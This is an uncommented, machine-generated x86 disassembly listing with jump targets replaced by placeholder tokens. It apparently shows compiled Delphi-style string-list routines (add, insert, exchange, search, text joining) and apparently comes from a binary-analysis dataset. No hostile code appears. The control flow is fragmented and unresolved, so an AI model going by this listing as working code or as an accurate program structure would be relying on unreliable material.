jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4182a8
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_4192c4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192ec
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419300
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4193ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030c4
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_404150
mov eax ebx
mov si 0xffff
call sub_403370
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193b5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov eax ebx
mov si 0xffff
call sub_403370
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403370
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4193c8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_40426c
sub_4193c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403f40
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403370
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40339c
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40339c
call sub_414618
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4194c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40339c
mov edx [ ebp - 0xc ]
call sub_41481c
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402714
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_4148a0
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_404150
sub_4194e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403300
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41814c
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419200
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418e64
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_418234
sub_41954c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418390
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418444
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418198
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_418e64
mov eax ebx
call sub_419200
pop edi
pop esi
pop ebx
retn
sub_4195b0
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_4195d4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a1b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_419604
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419628
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41964c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4196f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_4196d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196dd
mov eax [ ebp - 0x4 ]
call sub_419858
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419704
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418b70
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_419784
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419858
retn
sub_4197b4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41986c
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41980c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a050
mov eax [ ebp - 0x8 ]
push eax
push sub_41a3ac
push ebp
call sub_4197b4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41986c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419901
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419908
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f10
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042f8
jne r-xdata
sub_419918
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419914
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
jmp sub_403928
sub_419950
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419998
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c1c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41999f
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4199a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419a80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_419a5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a65
mov eax [ ebp - 0x4 ]
call sub_419858
retn
sub_419a9c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419ae1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043ac
call sub_4087c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ae8
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_419afa
leave
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419bfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f84
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403fdc
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c02
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f10
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4041ac
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4041ac
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4041ac
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4041ac
mov ebx eax
test ebx ebx
je r-xdata
sub_419c18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419c97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403eec
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041ac
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_40440c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c9e
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_419ca4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419d1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d23
lea eax [ ebp - 0xc ]
call sub_403eec
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_419d30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419df3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40440c
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a43c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4040d4
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c370
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dfa
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_419e04
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_419e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419e68
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41af78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419eb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419eb7
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_419ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_419f3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41aac4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403fdc
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f43
mov eax [ ebp - 0x4 ]
call sub_419858
retn
sub_419f68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a009
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a010
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_419fec
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419858
retn
sub_41a018
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a050
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a0f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41cd04
mov eax [ ebp - 0x4 ]
call sub_41979c
xor eax eax
push ebp
push sub_41a0cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41bda0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d9a4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0d6
mov eax [ ebp - 0x4 ]
call sub_419858
retn
sub_41a100
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41af78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a14b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a152
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_41a158
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a1a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4041ac
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41ad28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1ac
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41a1b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405770
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a1ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a22f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040e4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a236
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41a23c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a2f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41979c
xor edx edx
push ebp
push sub_41a2d3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2da
mov eax [ ebp - 0x4 ]
call sub_419858
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fdc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a300
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3a3
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f10
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_41a43c
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4040d4
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40426c
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_41a3ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
